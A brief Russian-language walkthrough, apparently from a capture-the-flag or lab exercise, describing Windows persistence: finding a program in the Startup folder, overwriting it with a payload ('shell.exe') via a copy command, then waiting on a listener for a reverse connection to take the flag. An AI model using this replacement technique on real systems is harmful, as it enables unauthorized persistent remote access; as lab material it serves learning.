Подключаемся к машине и находим программу в автозапуске по пути C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup
Создаем файл с полезной нагрузкой и заменяем его ```
copy /Y "shell.exe" "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\original.exe" ```

Запускаем слушателя и ждем соединения от системы => забираем флаг